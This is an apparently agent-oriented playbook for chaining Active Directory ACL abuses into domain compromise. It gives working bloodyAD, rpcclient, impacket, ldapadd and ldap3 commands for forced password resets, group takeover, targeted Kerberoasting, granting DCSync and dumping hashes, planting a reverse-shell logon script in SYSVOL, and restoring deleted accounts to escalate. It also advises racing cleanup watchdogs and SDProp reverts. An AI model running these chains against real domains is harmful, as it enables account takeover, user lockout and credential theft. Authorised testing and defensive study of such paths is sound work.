# AD ACL Abuse Chains

## When this applies

- You have foothold credentials in an AD domain.
- BloodHound or `bloodyAD get writable --detail` reveals an outgoing edge from your principal (Self-Membership, ForceChangePassword, GenericWrite, WriteDACL, GenericAll, AddSelf, etc.).
- Goal: chain ACL primitives to reach a privileged target (Domain Admin, replication rights, etc.).

## Technique

Each ACL primitive grants a specific write capability. Chain them: e.g., Self-Membership → join group → group has ForceChangePassword on target → reset target → log in as target → DCSync.

## Steps

```bash
# Enumerate ACLs with BloodHound or bloodyAD
bloodyAD -d domain -u user -p pass --host DC_IP get writable --detail
# IMPORTANT: BloodHound's graph is FROZEN at collection time. After ANY ACL change
# you make (set owner / add genericAll / add groupMember / set RBCD / shadow creds),
# new outgoing edges from your now-elevated principal are NOT in the cached graph —
# `Find shortest path to Domain Admin` will still show the pre-mutation paths.
# After every privilege gain, EITHER:
#   (a) Re-collect: faketime '+8h' bloodhound-python -u user -p pass -d dom -ns DC -c All --zip
#   (b) Verify the next hop manually with bloodyAD/nxc instead of trusting the UI:
#       bloodyAD -d dom -u user -p pass --host DC get object 'CN=Group,...' --resolve-sid
#       nxc ldap DC_IP -u user -p pass --groups-membership user
# The "graph says no path" trap kills attack chains — always re-verify after mutating.
# Common chain: Self-Membership on Group → Group has Force-Change-Password on Target
# Step 1: Add yourself to the privileged group
bloodyAD -d domain -u user -p pass --host DC_IP add groupMember "PrivGroup" "user"
# Step 2: Use the inherited permission (e.g., Force-Change-Password via SAMR)
rpcclient -U 'user%pass' DC_IP -c 'setuserinfo2 target_user 23 NewPassword!'
# Or via impacket SAMR: hSamrSetNTInternal1(dce, userHandle, newPass)
# TIMING: If a cleanup task reverts changes periodically, chain all steps in <60s

# === SPECIFIC ACL ABUSE RIGHTS ===
# ForceChangePassword — reset target's password without knowing current
bloodyAD -d domain -u user -p pass --host DC_IP set password target_user 'NewP@ss1!'
# Or: rpcclient -U 'user%pass' DC_IP -c 'setuserinfo2 target_user 23 NewP@ss1!'
# Or: net rpc password target_user 'NewP@ss1!' -U 'domain/user%pass' -S DC_IP

# WriteOwner on group → take ownership → grant GenericAll → add self as member
# NOTE: OWNER alone is NOT WriteDACL. Owner has only WO|RC implicit rights — `add genericAll`
# directly against an object you "own" returns insufficientAccessRights until you re-assert
# ownership with `set owner`. The set-owner-self call is what grants the WriteDACL needed for
# the next add-genericAll/ForceChangePassword/etc. step. Always do both.
bloodyAD -d domain -u user -p pass --host DC_IP set owner 'CN=TargetGroup,CN=Users,DC=domain,DC=com' 'user'
bloodyAD -d domain -u user -p pass --host DC_IP add genericAll 'CN=TargetGroup,CN=Users,DC=domain,DC=com' 'user'
bloodyAD -d domain -u user -p pass --host DC_IP add groupMember "TargetGroup" "user"

# GenericWrite on user → Shadow Credentials (PKINIT-based, requires ADCS)
#   See shadow-credentials.md

# GenericWrite on user → Targeted Kerberoasting (SPN injection)
#   Fallback when Shadow Credentials/PKINIT fails. Works on any DC.
#   Step 1: Set a fake SPN on the target user
bloodyAD -d domain -u user -p pass --host DC_IP set object target_user servicePrincipalName -v 'HTTP/fake.domain.com'
#   Step 2: Kerberoast to get the RC4 TGS hash
GetUserSPNs.py domain/user:'pass' -dc-ip DC_IP -request-user target_user
#   Step 3: Crack the hash (hashcat -m 13100 or john --format=krb5tgs)
#   Step 4: Clean up — remove the SPN
bloodyAD -d domain -u user -p pass --host DC_IP set object target_user servicePrincipalName

# GenericWrite on user → scriptPath hijack (logon script injection)
# Step 1: Upload reverse shell to SYSVOL (writable by any domain user)
smbclient //DC_IP/SYSVOL -U 'user%pass' -c 'put revshell.bat domain/scripts/revshell.bat'
# Step 2: Set target's scriptPath to the uploaded script
bloodyAD -d domain -u user -p pass --host DC_IP set object target_user scriptPath -v 'revshell.bat'
# Script executes on next login of target_user (or trigger via RDP/runas if you have creds)
# revshell.bat example: powershell -e <base64_encoded_reverse_shell>

# GenericAll / WriteDACL → grant yourself any permission
bloodyAD -d domain -u user -p pass --host DC_IP add genericAll 'OU=targets,DC=domain,DC=com' user
bloodyAD -d domain -u user -p pass --host DC_IP add dcsync user  # grant DCSync rights

# AddSelf / AddMember → add to privileged groups
bloodyAD -d domain -u user -p pass --host DC_IP add groupMember "Remote Management Users" "user"
bloodyAD -d domain -u user -p pass --host DC_IP add groupMember "Backup Operators" "user"

# === CHAINED PIVOT — WriteACL/ForceChangePassword → Reset → DCSync ===
# When BloodHound shows: foothold_user --[WriteOwner|WriteDACL|GenericAll|GenericWrite|
#   ForceChangePassword]--> intermediate_user --[GetChanges + GetChangesAll]--> Domain
# (the "intermediate" is typically a backup/sync svc account or a dedicated SOC/replication role).
# Two-step chain (always faster than Shadow Credentials when ADCS isn't enrolled):
#   Step 1: reset intermediate's password — ForceChangePassword does NOT need to know the old one.
#     bloodyAD -d dom -u foothold -p pass --host DC set password intermediate 'NewP@ss1!'
#   Step 2: log in AS intermediate and DCSync. From Linux, secretsdump as that user directly:
#     secretsdump.py 'dom/intermediate:NewP@ss1!@DC_IP' -just-dc-user "<locale-correct-admin>"
# This is the canonical post-foothold pivot when "DCSync from foothold" fails but a
# WriteACL/GenericWrite edge points to anyone with replication rights. Cleanup: reset
# intermediate's password back to a random value (or leave for blue-team to find).
# IMPORTANT: this resets the user's actual password — they will be locked out until reset
# or their next forced password change. On engagements, coordinate with the box owner /
# document the restoration step. In CTF/lab settings: a machine reset clears it.
```

## AD Recycle Bin / "restore-deleted-objects" group ACL abuse — silent DA equivalent

```bash
# A group granted CreateChild + WriteProperty at the domain root with InheritedObjectType:All
# is effectively Domain Admin even though it doesn't appear in AdminSDHolder's protected list.
# The "AD Recycle Bin", "Restore Admins", "Reanimate Tombstones", or any custom delegated
# group with broad inheritance falls into this category. Common real-world AD primitive.

# Detect on a foothold (PowerShell):
Import-Module ActiveDirectory
(Get-Acl "AD:DC=domain,DC=local").Access |
  Where-Object { $_.IdentityReference -match 'YourGroup' -or $_.ActiveDirectoryRights -match 'CreateChild|WriteProperty' } |
  Format-List IdentityReference, ActiveDirectoryRights, InheritedObjectType, ObjectType

# Look for: ActiveDirectoryRights = CreateChild,WriteProperty
#           InheritedObjectType   = 00000000-0000-0000-0000-000000000000  (= All object classes)
#           IdentityReference     = the group your principal is in

# Exploit path A — RBCD on the DC (preferred): write msDS-AllowedToActOnBehalfOfOtherIdentity
# on DC$ → S4U2Self/S4U2Proxy as Administrator → cifs/dc → \\dc\C$\Users\Administrator\Desktop\root.txt.
# Same chain as standard RBCD above, but the WriteProperty comes from the inherited ACL not
# from owning DC$.

# Exploit path B — create a new sensitive-group user under any container (Users, Computers,
# or even the domain root if the inherited ACL covers User class):
ldapadd -x -D 'YourUser@dom' -w 'pwd' -H ldap://dc -f - <<'EOF'
dn: CN=pwn,CN=Users,DC=domain,DC=local
objectClass: user
sAMAccountName: pwn
unicodePwd:: <utf16le_quoted_pwd_b64>
userAccountControl: 512
EOF
# Then add the new user to a sensitive group via WriteProperty on member.

# WHY this beats the "intended" tombstone-reanimation walkthrough on aged boxes:
# deletedObjectLifetime (default 180 days) expires → tombstones become recycled → unrecoverable.
# The ACL primitive is independent of the deleted-object pool and always works as long as
# the group ACL exists.
```

### Restoring a specific tombstoned object (when the chain expects it)

When the engagement *requires* reanimating a specific deleted account (commonly an ADCS enroller in `OU=ADCS`), `bloodyAD` 2.5.4 has no `restore`/`undelete` subcommand and a plain `modify_dn` from `CN=Deleted Objects` returns `insufficientAccessRights` even with WriteOwner on the deleted entry. The working primitive is a SINGLE atomic LDAP modify with **both** ops in one request, plus the `1.2.840.113556.1.4.417` showDeleted control:

```python
# ldap3 — one modify, two changes, one showDeleted control
from ldap3 import Server, Connection, Tls, MODIFY_DELETE, MODIFY_REPLACE
import ssl
s = Server('<DC_IP>', port=636, use_ssl=True,
           tls=Tls(validate=ssl.CERT_NONE))
c = Connection(s, '<DOMAIN>\\<USER>', '<PASS>',
               authentication='NTLM', auto_bind=True)

deleted_dn = ('CN=<USER>\\0ADEL:<GUID>,'
              'CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>')
new_dn     = 'CN=<USER>,<TARGET_PARENT_OU>'

c.modify(deleted_dn,
    {'isDeleted'        : [(MODIFY_DELETE,  [])],
     'distinguishedName': [(MODIFY_REPLACE, [new_dn])]},
    controls=[('1.2.840.113556.1.4.417', True, None)])
```

After restore, the account state varies by how it was deleted. Two cases:

**Case A — already enabled at restore** (common when the deleted account's saved UAC didn't have ACCOUNTDISABLE): a single `bloodyAD set password` as the user holding GenericAll on the parent OU is enough — the account is immediately usable.

```bash
# Attacker has GenericAll on the parent OU; restored target inherits it.
bloodyAD --host <DC_IP> -d <DOMAIN> -u <ATTACKER> -p '<PASS>' set password <TARGET> 'NewP@ss123!'
nxc smb <DC_IP> -u <TARGET> -p 'NewP@ss123!'        # → [+] auth succeeds
```

**Case B — restored disabled** (default for tombstones with `ACCOUNTDISABLE` in saved UAC): use the unicodePwd trick AND clear UAC:

```python
# Reset password (UTF-16-LE-encoded, double-quoted) and enable account.
new = '"<NEW_PASSWORD>"'.encode('utf-16-le')
c.modify(new_dn, {'unicodePwd': [(MODIFY_REPLACE, [new])]})
c.modify(new_dn, {'userAccountControl': [(MODIFY_REPLACE, ['66048'])]})  # NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD
```

If `bloodyAD set password` returns success but `nxc smb` says `STATUS_ACCOUNT_DISABLED`, you're in Case B — switch to the unicodePwd+UAC modify above.

When **multiple tombstones with the same name** exist (deleted/recreated/redeleted), match by `objectSid` against the SID listed in the target ACL (e.g., the WebServer template's enrollment ACE), not by `whenChanged` order. Only the SID with the relevant ACE will work.

If a watchdog/cleanup periodically re-deletes the restored account (common on lab boxes), execute the restore → password-reset → certipy-req chain back-to-back inside one window — don't pause between steps.

For ADCS ESC15 specifically (restored enroller against schema-v1 + EnrolleeSuppliesSubject template), see [adcs-esc15.md](adcs-esc15.md).
```

## AdminSDHolder hourly restore — caveat for ACL paths against protected groups

```
AD's SDProp task (every 60 minutes by default) overwrites the DACL on every member of
AdminSDHolder-protected groups (Domain Admins, Enterprise Admins, Schema Admins, Account
Operators, Backup Operators, Print Operators, Server Operators, etc.) and on adminCount=1
users with the AdminSDHolder template DACL. Inherited ACE-based privesc paths to a protected
account DO NOT survive an SDProp pass — they revert in <60 minutes.

Implications:
- Don't waste cycles on ACL paths that target protected accounts via INHERITANCE — write
  the ACE directly on the target object (it still gets reverted, but you have a one-shot
  window after the write).
- PREFER paths through:
  * Computer objects (DC$, server$) — never AdminSDHolder-protected, always durable.
  * Custom non-protected groups granted broad ACLs at root (Recycle Bin, Restore, etc.).
  * Service accounts not in a protected group, with kerberoastable SPNs or credential
    leaks — pivot through the cred, not the ACL.
- DETECT adminCount=1: `Get-ADUser -Filter {adminCount -eq 1} -Properties adminCount`. If
  your ACL target has adminCount=1, plan to use the ACE within 60 minutes of writing it.
```

## Verifying success

- `bloodyAD ... add groupMember/genericAll/...` returns success without LDAP error.
- Verify the new edge took effect: `nxc ldap DC -u user -p pass --groups-membership user` shows the new group, or `bloodyAD ... get object ... --resolve-sid` shows the new ACE.

## Common pitfalls

- BloodHound graph is stale after any mutation — always re-verify the next hop manually.
- AdminSDHolder reverts inherited ACEs on protected groups within 60 minutes — write directly to the target object and use the window quickly.
- ForceChangePassword resets the user's actual password — coordinate with engagement / lab reset.

## Tools

- bloodyAD
- BloodHound / SharpHound / bloodhound-python
- impacket `rpcclient`, `secretsdump.py`
- ldapadd / ldap3 (Python)
- nxc (netexec)
